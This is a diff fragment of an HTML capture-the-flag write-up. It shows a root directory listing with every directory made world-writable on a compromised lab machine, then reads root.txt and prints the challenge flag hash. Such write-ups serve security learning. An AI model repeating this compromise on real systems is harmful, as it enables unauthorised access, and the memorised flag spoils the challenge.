+drwxrwxrwx   2 root root  4096 Jun 27  2018 lib64
+drwxrwxrwx   2 root root 16384 Jun 27  2018 lost+found
+drwxrwxrwx   3 root root  4096 Jun 27  2018 media
+drwxrwxrwx   2 root root  4096 Jun 27  2018 mnt
+drwxrwxrwx   2 root root  4096 Jun 27  2018 opt
+drwxrwxrwx 111 root root     0 Feb 20 11:34 proc
+drwxrwxrwx   3 root root  4096 Nov  4 20:03 root
+drwxrwxrwx  18 root root   500 Feb 20 11:34 run
+drwxrwxrwx   2 root root  4096 Oct 28 16:40 sbin
+drwxrwxrwx   2 root root  4096 Jun 27  2018 srv
+drwxrwxrwx  13 root root     0 Feb 20 11:45 sys
+drwxrwxrwx   2 root root  4096 Feb 20 11:45 tmp
+drwxrwxrwx  10 root root  4096 Jun 27  2018 usr
+drwxrwxrwx  12 root root  4096 Jun 27  2018 var
+lrwxrwxrwx   1 root root    26 Oct 28 16:36 vmlinuz -> boot/vmlinuz-4.9.0-8-amd64
+lrwxrwxrwx   1 root root    26 Oct 28 16:36 vmlinuz.old -> boot/vmlinuz-4.9.0-6-amd64
+</pre>
+
+<p>Now we can read root's flag.</p>
+
+<pre class="prettyprint">
+giovanni@teacher:/root$ cat root.txt
+cat root.txt
+<span flag="4f3a83b42ac7723a508b8ace7b8b1209">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+</div>
